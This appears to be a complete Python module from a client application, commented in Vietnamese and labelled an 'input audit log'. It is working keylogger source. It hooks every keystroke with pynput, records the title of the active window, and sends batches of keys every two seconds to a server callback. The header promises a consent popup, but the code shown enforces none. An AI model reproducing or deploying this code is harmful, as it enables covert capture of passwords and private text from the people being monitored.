"""
===============================================================================
FILE: client-app/modules/keylogger.py
PURPOSE: Ghi nhật ký thao tác bàn phím (Input Audit Log) phục vụ kiểm toán hệ thống.
ARCHITECTURE ROLE:
  - Hardware Hooking Module (sử dụng `pynput`).
  - Thiết kế Buffer Thread-Safe gom dữ liệu định kỳ gửi về Server.
  - BẮT BUỘC trải qua User Consent Popup trước khi khởi tạo Hooking.
===============================================================================
"""

import ctypes
from ctypes import wintypes
import logging
import threading
import time
from typing import Callable, List, Dict, Any, Optional
from pynput import keyboard

logger = logging.getLogger("KeyloggerModule")

_user32 = ctypes.windll.user32

# Xả buffer mỗi 2 giây (hoặc khi đạt 50 phím) theo docs/api_contract.md
FLUSH_INTERVAL_SECONDS = 2.0
FLUSH_MAX_BUFFER = 50


def _get_active_window_title() -> str:
    """Lấy tiêu đề cửa sổ đang được focus (để đính kèm vào keylogger.data)."""
    try:
        hwnd = _user32.GetForegroundWindow()
        length = _user32.GetWindowTextLengthW(hwnd)
        if length == 0:
            return ""
        buffer = ctypes.create_unicode_buffer(length + 1)
        _user32.GetWindowTextW(hwnd, buffer, length + 1)
        return buffer.value
    except Exception:
        return ""


class KeyloggerService:
    """
    Class quản lý dịch vụ Hook Bàn phím và Buffer lưu trữ dữ liệu phím.
    """

    def __init__(self):
        self.is_logging: bool = False
        self._listener: Optional[keyboard.Listener] = None
        # Mỗi phần tử: {"key": str, "timestamp": int} — khớp payload.entries theo api_contract.md
        self._buffer: List[Dict[str, Any]] = []
        self._lock = threading.Lock() # Lock giúp đảm bảo an toàn đa luồng (Thread-Safety)
        self._flush_thread: Optional[threading.Thread] = None
        self._on_flush_callback: Optional[Callable[[List[Dict[str, Any]], str], None]] = None

    def start_logging(self, on_flush_callback: Callable[[List[Dict[str, Any]], str], None]):
        """
        Khởi chạy Dịch vụ Lắng nghe Bàn phím.

        Args:
            on_flush_callback: Hàm nhận (entries, window_title) để gửi về Gateway
                                dưới dạng message keylogger.data.
        """
        if self.is_logging:
            logger.warning("⚠️ Keylogger đã đang trong trạng thái hoạt động!")
            return

        self.is_logging = True
        self._on_flush_callback = on_flush_callback
        self._buffer = []

        # 1. Bắt đầu Listener Hook từ pynput
        self._listener = keyboard.Listener(on_press=self._on_key_press)
        self._listener.start()

        # 2. Mở Thread ngầm định kỳ xả Buffer (Flush Buffer) mỗi FLUSH_INTERVAL_SECONDS giây
        self._flush_thread = threading.Thread(target=self._periodic_flush_loop, daemon=True)
        self._flush_thread.start()

        logger.info("⌨️ [KEYLOGGER] Đã bật dịch vụ Ghi nhật ký bàn phím (Input Audit Log).")

    def stop_logging(self):
        """
        Dừng Dịch vụ Lắng nghe Bàn phím và xả sạch Buffer còn lại.
        """
        if not self.is_logging:
            return

        self.is_logging = False

        # Dừng Listener
        if self._listener:
            self._listener.stop()
            self._listener = None

        # Xả nốt dữ liệu còn sót lại trong Buffer
        self.flush_buffer()
        logger.info("🛑 [KEYLOGGER] Đã dừng dịch vụ Ghi nhật ký bàn phím.")

    def _on_key_press(self, key):
        """
        Callback xử lý mỗi khi có 1 phím được bấm down.
        """
        key_label = ""

        try:
            # Ký tự phím thường (a-z, 0-9, symbol)
            if hasattr(key, 'char') and key.char is not None:
                key_label = key.char
            else:
                # Phím chức năng đặc biệt
                if key == keyboard.Key.space:
                    key_label = "SPACE"
                elif key == keyboard.Key.enter:
                    key_label = "ENTER"
                elif key == keyboard.Key.backspace:
                    key_label = "BACKSPACE"
                elif key == keyboard.Key.tab:
                    key_label = "TAB"
                # Bỏ qua các phím điều khiển khác như Shift, Ctrl, Alt để tránh rác log
        except Exception:
            pass

        if key_label:
            with self._lock:
                self._buffer.append({"key": key_label, "timestamp": int(time.time())})

                # Nếu buffer đạt 50 phím, xả ngay lập tức không cần đợi FLUSH_INTERVAL_SECONDS
                if len(self._buffer) >= FLUSH_MAX_BUFFER:
                    self._flush_buffer_unsafe()

    def _periodic_flush_loop(self):
        """
        Thread ngầm tự động xả Buffer mỗi FLUSH_INTERVAL_SECONDS giây.
        """
        while self.is_logging:
            time.sleep(FLUSH_INTERVAL_SECONDS)
            self.flush_buffer()

    def flush_buffer(self):
        """
        Thread-safe method để xả Buffer về Callback.
        """
        with self._lock:
            self._flush_buffer_unsafe()

    def _flush_buffer_unsafe(self):
        """
        Hàm xả Buffer nội bộ (Cần gọi trong khối with self._lock).
        """
        if self._buffer and self._on_flush_callback:
            entries_to_send = self._buffer
            self._buffer = []  # Reset buffer về rỗng
            window_title = _get_active_window_title()

            # Đẩy dữ liệu ra Callback gửi qua WebSocket
            try:
                self._on_flush_callback(entries_to_send, window_title)
            except Exception as e:
                logger.error(f"❌ Lỗi gửi dữ liệu Keylogger qua callback: {str(e)}")


keylogger_service = KeyloggerService()